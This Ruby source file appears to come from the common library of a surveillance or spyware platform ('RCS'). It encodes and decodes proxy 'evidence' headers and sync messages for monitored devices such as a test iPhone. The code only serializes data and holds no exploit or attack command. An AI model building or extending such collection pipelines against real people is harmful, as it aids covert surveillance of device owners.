require 'rcs-common/evidence/common'

module RCS

module ProxyEvidence

  PROXY_VERSION = 2015040801

  def content
    binary = StringIO.new

    sync = {name: "Test iPhone",
            time: Time.now.getutc.to_i}

    binary.write sync.to_json
    binary.string
  end

  def generate_content
    [ content ]
  end

  # here type can be:
  # - sync_start
  # - sync_end
  # - evidence

  def additional_header
    header = StringIO.new
    header.write [PROXY_VERSION].pack("I")

    data = {platform: "ios",
            ident: "RCS_0000000001",
            instance: "20150407007b6a910e7ecc2e987060db2ff06cd8",
            type: :sync_start
            }

    header.write data.to_json

    header.string
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete PROXY") if data.nil? or data.bytesize == 0

    binary = StringIO.new data

    version = binary.read(4).unpack("I").first
    raise EvidenceDeserializeError.new("invalid log version for PROXY") unless version == PROXY_VERSION

    ret = Hash.new
    ret[:data] = Hash.new

    data = JSON.parse(binary.read)

    ret[:data][:platform] = data['platform']

    ret[:data][:ident] = data['ident']
    # overwrite the ident with the correct code
    ret[:data][:ident][0..3] = 'RCS_'

    ret[:data][:instance] = data['instance']
    ret[:data][:type] = data['type']

    return ret
  end


  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new

    # put the encrypted proxied evidence in the content, or parse the other commands
    if info[:data][:type].eql? 'evidence'
      info[:grid_content] = chunks.join
    else
      info[:data].merge! JSON.parse(chunks.join).symbolize_keys
    end

    yield info if block_given?
    :delete_raw
  end
end

end # RCS::
